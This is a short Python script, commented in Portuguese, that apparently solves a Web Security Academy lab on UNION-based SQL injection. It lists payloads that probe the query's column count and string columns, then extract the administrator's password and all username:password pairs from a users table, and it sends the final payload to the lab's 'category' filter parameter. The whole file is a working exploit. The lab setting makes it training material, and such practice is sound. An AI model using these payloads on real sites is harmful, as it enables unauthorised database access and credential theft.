import requests

# Parâmetro vulnerável: category

# PAYLOADS
# Descobrindo nº colunas da tabela da consulta original
sqli_1 = "' UNION SELECT NULL--" # Erro!
sqli_2 = "' UNION SELECT NULL,NULL--" # Erro!
sqli_3 = "' UNION SELECT NULL,NULL,NULL--" # OK! Tabela original tem 3 colunas
# Descobrindo colunas do tipo string
sqli_4 = "' UNION SELECT 'sw1k1D',NULL,NULL--" # Erro! Coluna não retorna tipo string
sqli_5 = "' UNION SELECT NULL,'sw1k1D',NULL--" # OK! Coluna retorna tipo string
sqli_6 = "' UNION SELECT NULL,NULL,'sw1k1D'--" # Erro! Coluna não retorna tipo string
# Ataques
sqli_7 = "'UNION SELECT NULL,password,NULL FROM users WHERE username='administrator'--"
sqli_8 = "'UNION SELECT NULL,username||': '||password,NULL FROM users--"

url = 'https://0a61009b032c687a81ab34a400b900cd.web-security-academy.net/filter'
params = {
    "category": "Pets" + sqli_8
}
response = requests.get(url, params=params)

print(response.text)